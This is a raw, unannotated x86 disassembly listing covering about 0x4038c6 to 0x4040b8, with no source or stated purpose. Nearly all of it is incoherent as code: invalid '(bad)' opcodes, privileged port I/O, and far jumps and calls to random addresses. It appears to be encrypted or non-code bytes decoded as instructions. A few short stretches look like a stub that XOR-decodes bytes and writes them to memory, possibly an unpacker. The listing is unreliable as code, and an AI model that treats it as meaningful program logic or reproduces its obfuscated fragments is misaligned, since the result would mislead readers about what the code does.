  4038c6:	call   0x2b8c45e2
  4038cb:	inc    edx
  4038cc:	frstor [edx-0x52]
  4038cf:	leave  
  4038d0:	push   ebx
  4038d2:	xchg   BYTE PTR [esi+eax*2],dl
  4038d5:	add    cl,BYTE PTR [eax+esi*1-0x7e53b9a0]
  4038dc:	ins    DWORD PTR es:[edi],dx
  4038dd:	mov    bh,0x1e
  4038df:	xor    eax,0xcf935829
  4038e4:	push   es
  4038e5:	aam    0x20
  4038e7:	mov    edx,0x928fc87e
  4038ec:	lods   eax,DWORD PTR ds:[esi]
  4038ed:	cdq    
  4038ee:	aam    0xf8
  4038f0:	xor    bh,BYTE PTR [ecx]
  4038f2:	lods   al,BYTE PTR ds:[esi]
  4038f3:	loope  0x403887
  4038f5:	jmp    0x40394c
  4038f7:	in     eax,0x7a
  4038f9:	mov    ch,0x0
  4038fb:	test   eax,0xd7e1b165
  403900:	add    edi,DWORD PTR [esi-0x54]
  403903:	dec    edi
  403904:	adc    bh,cl
  403906:	push   es
  403907:	push   es
  403908:	sbb    al,0x32
  40390a:	(bad)  
  40390b:	push   edx
  40390d:	inc    edx
  40390e:	call   0x76735044
  403913:	cmp    ah,BYTE PTR ds:0x75d8a625
  403919:	jae    0x403944
  40391b:	mov    esp,0xbb0e6cbc
  403920:	es or  al,0xee
  403923:	fwait
  403924:	dec    al
  403926:	call   0x9e26d420
  40392b:	sub    edi,DWORD PTR [ecx]
  40392d:	cmps   BYTE PTR ss:[esi],BYTE PTR es:[edi]
  40392f:	aas    
  403930:	pusha  
  403931:	loope  0x4038d1
  403933:	mov    bh,0xdb
  403935:	ins    BYTE PTR es:[edi],dx
  403936:	xor    BYTE PTR [edx-0x1b081822],0x2b
  40393d:	push   esi
  40393e:	test   DWORD PTR [edx+0x6f],edx
  403941:	or     ebx,DWORD PTR [edi]
  403943:	mov    ebp,0x5981d7c3
  403948:	bound  esp,QWORD PTR [edi+0x4aa8cd26]
  40394e:	sahf   
  40394f:	retf   0x367b
  403952:	mov    DWORD PTR [edx-0x20],ebx
  403955:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403956:	aam    0xd0
  403958:	aam    0xee
  40395a:	mov    ah,0xc1
  40395c:	icebp  
  40395d:	add    ch,BYTE PTR [esi]
  40395f:	sub    al,0x19
  403961:	loopne 0x4039b8
  403963:	cli    
  403964:	lods   al,BYTE PTR ds:[esi]
  403965:	das    
  403966:	jae    0x403956
  403968:	inc    eax
  403969:	jmp    0x7a6e4dfe
  40396e:	test   al,0x72
  403970:	sahf   
  403971:	pop    ds
  403972:	gs sti 
  403974:	or     ah,bh
  403976:	jecxz  0x403993
  403978:	xor    BYTE PTR [edi+0x6c],bh
  40397b:	mov    ds:0xceb683f4,eax
  403980:	fbld   TBYTE PTR [ebx-0x52]
  403983:	push   ss
  403984:	ins    DWORD PTR es:[edi],dx
  403985:	xor    DWORD PTR [ecx-0x6cf8e8ba],ebp
  40398b:	push   esp
  40398c:	pushf  
  40398d:	adc    BYTE PTR [eax-0x26f81c16],bl
  403993:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403994:	test   eax,eax
  403996:	je     0x403dd2
  40399c:	lea    eax,[ebp-0x98]
  4039a2:	push   eax
  4039a3:	mov    eax,DWORD PTR [ebp-0x1c]
  4039a6:	xor    eax,esi
  4039a8:	add    eax,edi
  4039aa:	push   eax
  4039ab:	mov    eax,DWORD PTR [ebp-0x18]
  4039ae:	add    eax,0xee
  4039b3:	push   eax
  4039b4:	mov    eax,DWORD PTR [ebp-0x18]
  4039b7:	mov    eax,DWORD PTR [eax+0x198]
  4039bd:	push   DWORD PTR [eax]
  4039bf:	jmp    0x403dcd
  4039c4:	push   es
  4039c5:	js     0x403a2e
  4039c7:	repnz popa 
  4039c9:	jno    0x40395e
  4039cb:	call   0xb3ee171
  4039d0:	jle    0x403a07
  4039d2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4039d3:	xor    esi,edi
  4039d5:	sbb    eax,0x7d6f7e7e
  4039da:	jle    0x403a5a
  4039dc:	push   DWORD PTR [ebx-0x75c65ed]
  4039e2:	cmp    al,BYTE PTR [ebp-0x41]
  4039e5:	and    edx,DWORD PTR [edi]
  4039e7:	js     0x403a52
  4039e9:	(bad)  [edx-0x2540ac7]
  4039ef:	pop    ebp
  4039f0:	outs   dx,DWORD PTR ds:[esi]
  4039f1:	fidivr WORD PTR [esi-0x6dbdbc07]
  4039f7:	fimul  DWORD PTR [ecx+0x12]
  4039fa:	mov    ecx,0xf2a0e3
  4039ff:	aaa    
  403a00:	lea    esi,[esi]
  403a02:	inc    ebx
  403a03:	fdiv   st,st(1)
  403a05:	push   edx
  403a06:	mov    esi,0xfebab32a
  403a0b:	fldcw  WORD PTR [esi]
  403a0d:	aad    0xd2
  403a0f:	add    DWORD PTR [edi],0x1e235c8a
  403a15:	sub    dl,BYTE PTR [ecx-0x633f03f4]
  403a1b:	sbb    al,ah
  403a1d:	sbb    edx,DWORD PTR [esi-0x77dd5908]
  403a23:	pop    es
  403a24:	lock mov ebx,0x4f281628
  403a2a:	loop   0x4039e4
  403a2c:	test   BYTE PTR [eax-0x1f214933],ch
  403a32:	es test al,0xf9
  403a35:	popa   
  403a36:	lods   al,BYTE PTR ds:[esi]
  403a37:	fldcw  WORD PTR [edi+0xe]
  403a3a:	icebp  
  403a3b:	out    dx,eax
  403a3c:	aad    0x9e
  403a3e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403a3f:	inc    esp
  403a40:	mov    eax,0x7516ed66
  403a45:	test   BYTE PTR [ebx-0x6e0fcc13],dh
  403a4b:	bound  ebx,QWORD PTR [edi+0x5d]
  403a4e:	lock rol DWORD PTR [ebp-0x4d908432],cl
  403a55:	sbb    dl,BYTE PTR [esi-0x70]
  403a58:	jmp    0x2f6f:0xd1429284
  403a5f:	mov    al,0x5
  403a61:	xchg   esp,eax
  403a62:	js     0x403a2b
  403a64:	xchg   DWORD PTR ds:0xed3fbef2,esp
  403a6a:	add    esi,DWORD PTR [edi]
  403a6c:	push   esp
  403a6d:	mov    bh,0x72
  403a6f:	jmp    0x6a93ef9f
  403a74:	pop    ss
  403a75:	aas    
  403a76:	sbb    eax,0xd982fd76
  403a7b:	fs dec eax
  403a7d:	ds pop ds
  403a7f:	fidivr WORD PTR [edi]
  403a81:	sahf   
  403a82:	retf   0x1a53
  403a85:	push   ss
  403a86:	loop   0x403ac0
  403a88:	lds    esp,FWORD PTR [ebx+0x736696b7]
  403a8e:	and    al,0xd7
  403a90:	xor    DWORD PTR [edx],ecx
  403a92:	mov    ebx,0xda191b08
  403a97:	ds xchg edi,eax
  403a99:	xlat   BYTE PTR ds:[ebx]
  403a9a:	adc    ecx,0x68
  403a9d:	mov    eax,ds:0xc0b64fab
  403aa2:	sahf   
  403aa3:	jae    0x403af8
  403aa5:	es jae 0x403b1d
  403aa8:	mov    bh,0x8e
  403aaa:	pop    ds
  403aab:	pop    esi
  403aac:	mov    ah,0x59
  403aae:	imul   ebx,DWORD PTR [eax],0x84a117bc
  403ab4:	stc    
  403ab5:	and    al,0xa
  403ab7:	sbb    DWORD PTR [ebp-0x2418ae8e],ebx
  403abd:	cmc    
  403abe:	mov    cl,0x1e
  403ac0:	sub    eax,0x633c05b6
  403ac5:	push   cs
  403ac6:	pop    ecx
  403ac7:	mov    al,BYTE PTR ds:0x572ef1f4
  403acd:	xor    eax,0xeb73d361
  403ad2:	test   eax,0xa7613842
  403ad7:	in     al,dx
  403ad8:	cwde   
  403ad9:	loopne 0x403b41
  403adb:	outs   dx,BYTE PTR ds:[esi]
  403adc:	adc    eax,0x244e041d
  403ae1:	xchg   edi,eax
  403ae2:	pop    edx
  403ae3:	(bad)  
  403ae4:	sub    al,0xde
  403ae6:	add    eax,0xe1b7cfa1
  403aeb:	dec    ebx
  403aec:	push   0xf71c1e71
  403af1:	fisub  WORD PTR [esp+esi*4-0x5c]
  403af5:	sub    DWORD PTR ss:[ebx+0x6721ae4],edx
  403afc:	jbe    0x403b41
  403afe:	mov    bh,0x8d
  403b00:	and    eax,0x9b351cd0
  403b05:	das    
  403b06:	(bad)  
  403b07:	sbb    BYTE PTR [ebp+0x3e6c21f7],cl
  403b0d:	loopne 0x403b63
  403b0f:	rcr    BYTE PTR [ebp-0x29],1
  403b12:	adc    DWORD PTR [ecx+0x91e7ea8],ebx
  403b18:	pop    es
  403b19:	push   eax
  403b1a:	xchg   ecx,eax
  403b1b:	rcr    BYTE PTR [eax+0x6a4e9903],1
  403b21:	xor    cl,bl
  403b23:	(bad)
  403b26:	inc    ebp
  403b27:	gs aas 
  403b29:	mov    ah,0xf8
  403b2b:	mov    ch,0xb
  403b2d:	(bad)  
  403b2e:	lock push esi
  403b30:	cwde   
  403b31:	xor    al,0x87
  403b33:	mov    al,0x33
  403b35:	cmp    BYTE PTR [edx],ch
  403b37:	repnz cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403b39:	or     al,0xea
  403b3b:	test   eax,0x4a7985ed
  403b40:	scas   al,BYTE PTR es:[edi]
  403b41:	cmp    DWORD PTR [edx],edi
  403b43:	adc    BYTE PTR [ebx-0x51],0xb4
  403b47:	mov    esp,0xa434c030
  403b4c:	mov    dl,0x96
  403b4e:	mov    ah,0x72
  403b50:	ds pop eax
  403b52:	popf   
  403b53:	jecxz  0x403bb4
  403b55:	or     BYTE PTR [ecx+edx*2],bh
  403b58:	imul   esp,DWORD PTR [ebx+0x4a],0xe6ee7e64
  403b5f:	dec    edi
  403b60:	fdiv   DWORD PTR [edx-0x60425c7f]
  403b66:	sti    
  403b67:	inc    esp
  403b68:	adc    eax,eax
  403b6a:	mov    ch,0xcd
  403b6c:	iret   
  403b6d:	inc    ecx
  403b6e:	push   esp
  403b6f:	(bad)  [edi-0xa5d4ef8]
  403b75:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403b76:	ror    DWORD PTR fs:[edi-0x3eb3f568],cl
  403b7d:	scas   al,BYTE PTR es:[edi]
  403b7e:	xor    al,0x5b
  403b80:	jle    0x403b67
  403b82:	and    BYTE PTR [edx+0x44],ch
  403b85:	ins    BYTE PTR es:[edi],dx
  403b86:	les    ecx,FWORD PTR [eax-0x4aec6531]
  403b8c:	mov    ebx,0xb6690ccd
  403b91:	cmc    
  403b92:	jmp    0xe7bbe3e4
  403b97:	pop    esi
  403b98:	pop    edx
  403b99:	mov    al,ds:0x99a87676
  403b9e:	addr16 js 0x403be2
  403ba1:	jb     0x403b5e
  403ba3:	sar    BYTE PTR [ecx-0x7ad15308],0x22
  403baa:	xchg   edi,eax
  403bab:	je     0x403b65
  403bad:	push   ecx
  403bae:	mov    DWORD PTR [edx-0x3b],eax
  403bb1:	cmp    edx,DWORD PTR [ebx]
  403bb3:	mov    ebx,DWORD PTR [ecx+ecx*1]
  403bb6:	jge    0x403b77
  403bb8:	stc    
  403bb9:	mov    dl,0x94
  403bbb:	or     al,0x16
  403bbd:	cmp    dh,bl
  403bbf:	sti    
  403bc0:	mov    ds:0x3e035286,eax
  403bc5:	xchg   edx,eax
  403bc6:	cli    
  403bc7:	sbb    dx,WORD PTR [edx-0x7ba662da]
  403bce:	or     al,0x97
  403bd0:	test   ebp,ebp
  403bd2:	xchg   edx,eax
  403bd3:	inc    ecx
  403bd4:	fwait
  403bd5:	jecxz  0x403c2f
  403bd7:	inc    esp
  403bd8:	stc    
  403bd9:	push   es
  403bda:	popf   
  403bdb:	lods   eax,DWORD PTR ds:[esi]
  403bdc:	sub    eax,0xdb909236
  403be1:	mov    esp,0xfc471742
  403be6:	cmp    al,0xa7
  403be8:	scas   al,BYTE PTR es:[edi]
  403be9:	xchg   ebp,eax
  403bea:	xor    esp,DWORD PTR [eax]
  403bec:	test   BYTE PTR [ebx+0x2438593a],dl
  403bf2:	xor    bl,BYTE PTR [edx]
  403bf4:	xchg   ecx,eax
  403bf5:	loopne 0x403bcc
  403bf7:	and    BYTE PTR [ebx+0x56374390],0x83
  403bfe:	lea    ebx,[edi]
  403c00:	jp     0x403be5
  403c02:	call   0x4f08:0x510f8d6e
  403c09:	sbb    ah,BYTE PTR [bp+di+0x4555]
  403c0e:	popf   
  403c0f:	xor    ecx,DWORD PTR [eax-0x13bec10d]
  403c15:	dec    ecx
  403c16:	sub    DWORD PTR [edx+eax*8],ecx
  403c19:	rcl    BYTE PTR [edx-0x42e6c6ba],cl
  403c1f:	nop
  403c20:	pop    esp
  403c21:	xchg   edi,eax
  403c22:	add    DWORD PTR [ecx-0x47],eax
  403c25:	sub    eax,DWORD PTR [edi]
  403c27:	mov    DWORD PTR [eax+0x47],esp
  403c2a:	jmp    0xbb9a:0xca8dc795
  403c31:	(bad)
  403c34:	jns    0x403c94
  403c36:	loopne 0x403c5d
  403c38:	out    0xf1,eax
  403c3a:	cmc    
  403c3b:	xor    eax,0x45996373
  403c40:	ret    0xff14
  403c43:	arpl   WORD PTR [ecx+eax*4-0x1b],bx
  403c47:	cmp    ecx,DWORD PTR [edx+ecx*1-0x53]
  403c4b:	sbb    BYTE PTR [esi+0x36c6075f],bh
  403c51:	call   0xdc61:0x46b158b3
  403c58:	test   DWORD PTR ds:0xb10e4414,eax
  403c5e:	mov    bh,0x25
  403c60:	ins    BYTE PTR es:[edi],dx
  403c61:	add    eax,0xf5cdc
  403c66:	adc    BYTE PTR ds:0x7b8d11b6,0x3d
  403c6d:	test   eax,0xa3c21d9e
  403c72:	xchg   BYTE PTR [edi],ah
  403c74:	ret    0x7451
  403c77:	and    eax,0xf09b8d4b
  403c7c:	ins    BYTE PTR es:[edi],dx
  403c7d:	fs mov ah,0xb7
  403c80:	es in  eax,0xb5
  403c83:	icebp  
  403c84:	ret    
  403c85:	rol    BYTE PTR [edi-0x610c023],cl
  403c8b:	xor    ecx,edx
  403c8d:	cs dec ebx
  403c8f:	je     0x403ccc
  403c91:	inc    esi
  403c92:	stc    
  403c93:	iret   
  403c94:	outs   dx,DWORD PTR gs:[esi]
  403c96:	xor    edi,eax
  403c98:	aaa    
  403c99:	sub    al,0x95
  403c9b:	or     DWORD PTR [ebp+0x7b46d3c1],0x54
  403ca2:	or     al,0xce
  403ca4:	inc    esp
  403ca5:	mov    bl,0x44
  403ca7:	cmp    ebp,DWORD PTR [esp+ebx*1]
  403caa:	in     al,0xf1
  403cac:	inc    edi
  403cad:	sbb    al,BYTE PTR [edx]
  403caf:	cld    
  403cb0:	dec    esp
  403cb1:	(bad)  
  403cb2:	dec    esi
  403cb3:	mov    ds:0x545b5b72,eax
  403cb8:	test   ch,dl
  403cba:	ja     0x403d39
  403cbc:	ins    BYTE PTR es:[edi],dx
  403cbd:	fisttp QWORD PTR [edx+0x22a5c4ef]
  403cc3:	shl    DWORD PTR [eax+edx*2-0x2cd4cbef],0xe0
  403ccb:	in     eax,dx
  403ccc:	sbb    bl,ch
  403cce:	scas   al,BYTE PTR es:[edi]
  403ccf:	adc    BYTE PTR [edx-0x5bf5987],al
  403cd5:	repz pusha 
  403cd7:	inc    ebp
  403cd8:	shr    DWORD PTR [edx+ebp*1-0x6c2a780c],cl
  403cdf:	pop    esi
  403ce0:	push   eax
  403ce1:	and    esp,ecx
  403ce3:	jp     0x403cdf
  403ce5:	adc    al,0xd1
  403ce7:	aam    0xc1
  403ce9:	iret   
  403cea:	test   BYTE PTR [ecx-0x30cff3b1],ah
  403cf0:	mov    al,0x22
  403cf2:	xchg   ebp,esi
  403cf4:	push   ebx
  403cf5:	mov    WORD PTR [eax-0x3a9c2438],fs
  403cfb:	fcomp  QWORD PTR [edx-0x2b681ccd]
  403d01:	pop    ebx
  403d02:	fstp   QWORD PTR gs:[ebx-0xbc9cc3e]
  403d09:	jo     0x403d3b
  403d0b:	enter  0x631f,0x60
  403d0f:	aaa    
  403d10:	pop    ecx
  403d11:	(bad)  
  403d13:	in     eax,dx
  403d14:	sbb    bl,BYTE PTR [eax]
  403d16:	xor    dh,BYTE PTR [eax-0x77]
  403d19:	aaa    
  403d1a:	add    DWORD PTR [eax-0x4e],ebx
  403d1d:	mov    ecx,0x6a7f8e0f
  403d22:	aas    
  403d23:	mov    cl,0xc7
  403d25:	sti    
  403d26:	mov    edx,0x9b7ed9c0
  403d2b:	pusha  
  403d2c:	mov    ds:0xcde56ce2,eax
  403d31:	xchg   ebx,eax
  403d32:	fisubr WORD PTR [ebx+ecx*8]
  403d35:	cld    
  403d36:	nop
  403d37:	mov    eax,ds:0x99097772
  403d3c:	mov    BYTE PTR [eax+0x332332be],dl
  403d42:	jo     0x403d97
  403d44:	xor    ah,BYTE PTR [esi]
  403d46:	popf   
  403d47:	jbe    0x403d39
  403d49:	fisubr WORD PTR ds:0xe2b1b88
  403d4f:	adc    DWORD PTR [ecx-0x749cc9a9],eax
  403d55:	into   
  403d56:	sbb    BYTE PTR [esp+ebp*4],dl
  403d59:	pushf  
  403d5a:	lods   eax,DWORD PTR ds:[esi]
  403d5b:	fdivr  QWORD PTR [ebx-0x3]
  403d5e:	mov    dh,0xfd
  403d60:	clc    
  403d61:	in     al,0x41
  403d63:	outs   dx,DWORD PTR ds:[esi]
  403d64:	mov    ebp,0x91ad11c
  403d69:	adc    ebp,ebx
  403d6b:	jbe    0x403d22
  403d6d:	mov    bl,0xfc
  403d6f:	push   0x37488156
  403d74:	mov    eax,ds:0x8a1c7de3
  403d79:	lods   eax,DWORD PTR ds:[esi]
  403d7a:	push   ecx
  403d7b:	ficom  WORD PTR [esi+0x3591d9e7]
  403d81:	xchg   ebp,eax
  403d82:	nop
  403d83:	xchg   ecx,eax
  403d84:	daa    
  403d85:	neg    DWORD PTR [edi+0xc]
  403d88:	pop    edi
  403d89:	sbb    ebp,DWORD PTR [edx]
  403d8b:	mov    esi,0x41f3b32e
  403d90:	icebp  
  403d91:	xchg   BYTE PTR [ebx+0x33cecc5b],cl
  403d97:	fdiv   DWORD PTR [ebp-0x254b4d7f]
  403d9d:	push   es
  403d9e:	xor    al,ch
  403da0:	mov    esi,0xc55c1c2a
  403da5:	jnp    0x403d50
  403da7:	pusha  
  403da8:	shl    BYTE PTR [edi-0x6e],0xf7
  403dac:	fst    QWORD PTR [edx-0x23]
  403daf:	adc    esp,edi
  403db1:	mov    ss,WORD PTR [esi-0x3f]
  403db4:	push   edi
  403db5:	mov    ch,0x33
  403db7:	mov    dl,0xba
  403db9:	(bad)  [eax+0x4e5e39b2]
  403dbf:	adc    eax,0xb7b69992
  403dc4:	jnp    0x403e11
  403dc6:	not    BYTE PTR [ebp+0x29dd6927]
  403dcc:	mov    eax,ebp
  403dce:	mov    DWORD PTR [edx+0x4d8b0000],0xb8ce33d8
  403dd8:	gs (bad) 
  403dda:	int    0xff
  403ddc:	sub    eax,ecx
  403dde:	sub    eax,DWORD PTR [ebp-0x4]
  403de1:	mov    ecx,DWORD PTR [ebp-0x48]
  403de4:	add    ecx,eax
  403de6:	mov    eax,DWORD PTR [ebp-0x4]
  403de9:	mov    DWORD PTR [eax+0x1],ecx
  403dec:	mov    al,BYTE PTR [ebp-0x11]
  403def:	mov    ecx,DWORD PTR [ebp-0x4]
  403df2:	xor    al,0x46
  403df4:	sub    al,0x38
  403df6:	mov    BYTE PTR [ecx],al
  403df8:	lea    eax,[ebp-0x4]
  403dfb:	inc    BYTE PTR [eax]
  403dfd:	inc    eax
  403dfe:	push   eax
  403dff:	pop    ecx
  403e00:	dec    ecx
  403e01:	jmp    0x40420f
  403e06:	dec    esp
  403e07:	repz repz adc esi,DWORD PTR [ecx+0x13]
  403e0c:	ins    BYTE PTR es:[edi],dx
  403e0d:	jno    0x403e09
  403e0f:	in     eax,0x73
  403e11:	sbb    DWORD PTR [edx],edx
  403e13:	in     eax,dx
  403e14:	pop    edx
  403e15:	ins    DWORD PTR es:[edi],dx
  403e16:	in     al,0x19
  403e18:	jle    0x403e98
  403e1a:	outs   dx,DWORD PTR ds:[esi]
  403e1b:	jge    0x403e9b
  403e1d:	jle    0x403e8a
  403e1f:	mov    ecx,0x77b3536a
  403e24:	rcr    DWORD PTR [edx-0x31],cl
  403e27:	xchg   ebp,eax
  403e28:	leave  
  403e29:	push   es
  403e2a:	xor    BYTE PTR [edx],0x78
  403e2d:	pop    es
  403e2e:	mov    bl,0x10
  403e30:	mov    eax,edx
  403e32:	outs   dx,DWORD PTR ds:[esi]
  403e33:	daa    
  403e34:	and    al,0x19
  403e36:	and    al,BYTE PTR [esi+ebp*4-0x58de4322]
  403e3d:	mov    ah,0xef
  403e3f:	(bad)  
  403e40:	out    0xf3,al
  403e42:	fisttp WORD PTR [eax+edi*4]
  403e45:	mov    ch,0x8a
  403e47:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403e48:	int    0x1b
  403e4a:	stc    
  403e4b:	punpcklwd mm1,DWORD PTR [esi-0x65dbc8a3]
  403e52:	call   0xbfcd:0x68cb98ca
  403e59:	cli    
  403e5a:	add    BYTE PTR [edi+0x4c],0x18
  403e5e:	test   eax,0x6c3459b5
  403e63:	arpl   WORD PTR [edx-0x38],cx
  403e66:	pop    edx
  403e67:	lock rcl BYTE PTR ds:0xf87538b7,cl
  403e6e:	mov    BYTE PTR ds:0x8fb99d0,dl
  403e74:	inc    esp
  403e75:	aam    0xc9
  403e77:	sub    cl,ah
  403e79:	push   ecx
  403e7a:	push   ss
  403e7b:	in     al,dx
  403e7c:	xchg   edi,eax
  403e7d:	out    dx,eax
  403e7e:	sbb    eax,0x3b13532e
  403e83:	pop    edx
  403e84:	adc    eax,0x8972cd03
  403e89:	fcomp  QWORD PTR [edx]
  403e8b:	push   ebp
  403e8c:	xlat   BYTE PTR ds:[ebx]
  403e8d:	cmp    al,0x3f
  403e8f:	aas    
  403e90:	adc    eax,DWORD PTR [ebx+0x7e9d9146]
  403e96:	ds jl  0x403e1a
  403e99:	dec    dh
  403e9b:	stos   BYTE PTR es:[edi],al
  403e9c:	add    BYTE PTR [ebx+0x7e5a810a],ch
  403ea2:	inc    ebx
  403ea3:	xchg   edx,eax
  403ea4:	loopne 0x403e66
  403ea6:	fistp  DWORD PTR [esi+0x2c]
  403ea9:	sbb    BYTE PTR [edx-0x3859f5d5],ah
  403eaf:	jns    0x403f04
  403eb1:	enter  0xfb85,0x58
  403eb5:	int    0x4b
  403eb7:	enter  0x26d6,0x16
  403ebb:	pop    edx
  403ebc:	out    dx,eax
  403ebd:	sub    DWORD PTR [esi+0x7042971c],eax
  403ec3:	mov    ?,WORD PTR [edi-0x25e27a51]
  403ec9:	pop    ss
  403eca:	jnp    0x403e76
  403ecc:	sahf   
  403ecd:	dec    eax
  403ece:	jp     0x403e64
  403ed0:	add    al,0xac
  403ed2:	test   eax,0x48d4df33
  403ed7:	leave  
  403ed8:	stos   DWORD PTR es:[edi],eax
  403ed9:	sbb    eax,DWORD PTR [ebx+0x1df0dda6]
  403edf:	mov    ebp,0x4221bfc5
  403ee4:	int    0xc9
  403ee6:	add    ah,BYTE PTR [eax]
  403ee8:	outs   dx,DWORD PTR ds:[esi]
  403ee9:	sbb    al,0xa3
  403eeb:	jmp    0xe823a708
  403ef0:	repnz or BYTE PTR [ebp+0x73a8e2d0],al
  403ef7:	adc    BYTE PTR [eax-0x1951ff6d],0xf0
  403efe:	xchg   edx,eax
  403eff:	pop    es
  403f00:	aaa    
  403f01:	mov    ebp,0xcf870533
  403f06:	mov    edi,0x28197e40
  403f0b:	ins    BYTE PTR es:[edi],dx
  403f0c:	xor    al,0x25
  403f0e:	clc    
  403f0f:	or     BYTE PTR [edx],bh
  403f11:	loope  0x403ebb
  403f13:	sub    dh,BYTE PTR [esp+edi*2-0x58]
  403f17:	gs and eax,0xd487c2e2
  403f1d:	retf   0xe442
  403f20:	stc    
  403f21:	sahf   
  403f22:	jmp    0x9ae0:0x114848c
  403f29:	hlt    
  403f2a:	gs pop ebp
  403f2c:	add    BYTE PTR [edx+0x360de420],al
  403f32:	push   ss
  403f33:	lahf   
  403f34:	arpl   WORD PTR [edi+0x31e43131],ax
  403f3a:	bound  ebx,QWORD PTR [edi+ecx*1+0x29]
  403f3e:	cmp    bl,cl
  403f40:	in     al,dx
  403f41:	and    eax,DWORD PTR [ebx+0x4b0ba99f]
  403f47:	adc    ebp,ecx
  403f49:	jo     0x403f92
  403f4b:	xor    eax,0xccbe5bf2
  403f50:	popf   
  403f51:	jp     0x403f0b
  403f53:	and    esp,esi
  403f55:	mov    ah,ah
  403f57:	enter  0x7bd3,0x81
  403f5b:	retf   0xdbda
  403f5e:	push   edx
  403f5f:	lahf   
  403f60:	sar    BYTE PTR [eax-0x23520195],1
  403f66:	adc    dh,dl
  403f68:	mov    ebp,ebx
  403f6a:	inc    ebx
  403f6b:	inc    ebp
  403f6c:	ret    0x9c2d
  403f6f:	call   0xa89ea277
  403f74:	aam    0xa6
  403f76:	xchg   ebp,eax
  403f77:	and    DWORD PTR [ecx-0x62],ebp
  403f7a:	fistp  WORD PTR [edx-0x2321a28b]
  403f80:	mov    bl,0x2f
  403f82:	(bad)  
  403f83:	repnz in eax,0x18
  403f86:	mov    gs,WORD PTR [ecx]
  403f88:	jmp    0x403f88
  403f8a:	inc    eax
  403f8b:	out    dx,al
  403f8c:	pushf  
  403f8d:	pop    ebp
  403f8e:	and    DWORD PTR [ebx-0x3eb52d19],esi
  403f94:	fdiv   QWORD PTR [esi+0x48]
  403f97:	out    dx,eax
  403f98:	aam    0xf0
  403f9a:	pop    ds
  403f9b:	dec    ebx
  403f9c:	dec    ecx
  403f9d:	lea    edx,[edx]
  403f9f:	mov    cl,0x81
  403fa1:	adc    ebx,ebx
  403fa3:	call   0x15a4:0xb219002
  403faa:	mov    ds:0x6854f9be,eax
  403faf:	ret    
  403fb0:	mov    edi,0x8faacc02
  403fb5:	pop    esp
  403fb6:	in     eax,dx
  403fb7:	pop    ebx
  403fb8:	cmp    al,0xf3
  403fba:	push   0xdf813a9c
  403fbf:	ins    DWORD PTR es:[edi],dx
  403fc0:	test   BYTE PTR [edi+0x35cdff1],al
  403fc6:	xor    cl,BYTE PTR [ecx-0x57]
  403fc9:	ret    0xb996
  403fcc:	sub    eax,0x19a5f751
  403fd1:	xor    bh,cl
  403fd3:	(bad)  
  403fd5:	ficomp WORD PTR [ecx-0x7d]
  403fd8:	push   ds
  403fd9:	call   0x253a0934
  403fde:	aad    0xc
  403fe0:	adc    DWORD PTR [ebx+0x114cd6ae],eax
  403fe6:	arpl   WORD PTR [ecx+0x20],di
  403fe9:	add    bh,dl
  403feb:	or     eax,eax
  403fed:	ins    BYTE PTR es:[edi],dx
  403fee:	bound  ebx,QWORD PTR [edx]
  403ff0:	leave  
  403ff1:	sbb    DWORD PTR cs:[ecx-0x72568894],esp
  403ff8:	in     eax,dx
  403ff9:	gs push ss
  403ffb:	dec    ebx
  403ffc:	xor    al,BYTE PTR [edx]
  403ffe:	pop    ds
  403fff:	je     0x40407a
  404001:	adc    dh,al
  404003:	test   al,0x24
  404005:	inc    ebp
  404006:	dec    ecx
  404007:	out    dx,al
  404008:	jae    0x403f91
  40400a:	in     eax,0xc6
  40400c:	sbb    edx,DWORD PTR [edx]
  40400e:	fcmovb st,st(2)
  404010:	jle    0x403fef
  404012:	mov    esi,DWORD PTR [ecx-0x32d47f42]
  404018:	aam    0x1b
  40401a:	sti    
  40401b:	call   0x6cb5:0x8a2a1561
  404022:	nop
  404023:	outs   dx,DWORD PTR ds:[esi]
  404024:	dec    edi
  404025:	aas    
  404026:	imul   DWORD PTR [edi+0x11]
  404029:	mov    bh,0x3e
  40402b:	xchg   ecx,eax
  40402c:	pushf  
  40402d:	jnp    0x404049
  40402f:	lods   eax,DWORD PTR ds:[esi]
  404030:	ins    BYTE PTR es:[edi],dx
  404031:	rcl    DWORD PTR [ebx-0x3d],1
  404034:	arpl   cx,si
  404036:	xchg   cl,ah
  404038:	pop    esp
  404039:	push   0xffffff80
  40403b:	mov    edx,0xa3d890b
  404040:	sub    eax,0xbe7972b1
  404045:	mov    al,ds:0x74c4c519
  40404a:	sub    bl,BYTE PTR [edi-0x4ecec6e9]
  404050:	cmp    al,ch
  404052:	icebp  
  404053:	bound  ebp,QWORD PTR [edi+0x32]
  404056:	icebp  
  404057:	cmp    ch,BYTE PTR [edx]
  404059:	or     eax,0x94c92dfe
  40405e:	es test al,0x54
  404061:	pop    esp
  404062:	popa   
  404063:	dec    edx
  404064:	jno    0x40406f
  404066:	xchg   ebp,eax
  404067:	adc    eax,0x8f84f869
  40406c:	fdivr  DWORD PTR [edi]
  40406e:	xor    BYTE PTR [eax-0x7ee349da],al
  404074:	jmp    0x4040e2
  404076:	mov    eax,0xdfb8c630
  40407b:	sti    
  40407c:	retf   0x99ec
  40407f:	(bad)  
  404081:	or     ebx,DWORD PTR [ecx]
  404083:	xchg   edi,eax
  404084:	dec    edi
  404085:	retf   0xf8c6
  404088:	dec    eax
  404089:	cmp    edi,DWORD PTR [edx]
  40408b:	cwde   
  40408c:	std    
  40408d:	outs   dx,BYTE PTR ds:[esi]
  40408e:	pop    ds
  40408f:	fisttp WORD PTR [eax+0x75b92414]
  404095:	leave  
  404096:	cdq    
  404097:	shr    BYTE PTR [edi-0x6cc6754],0x1c
  40409e:	sahf   
  40409f:	fsubr  QWORD PTR [ebx]
  4040a1:	dec    ebx
  4040a2:	push   esp
  4040a3:	call   0x1e68ed7b
  4040a8:	cmp    ecx,ecx
  4040aa:	inc    eax
  4040ab:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4040ac:	clc    
  4040ad:	js     0x404105
  4040af:	out    0x20,eax
  4040b1:	mov    DWORD PTR [ebp-0x2a],esp
  4040b4:	sahf   
  4040b5:	push   cs
  4040b6:	dec    ebx
  4040b7:	xchg   ecx,eax
  4040b8:	repnz xchg ebp,eax
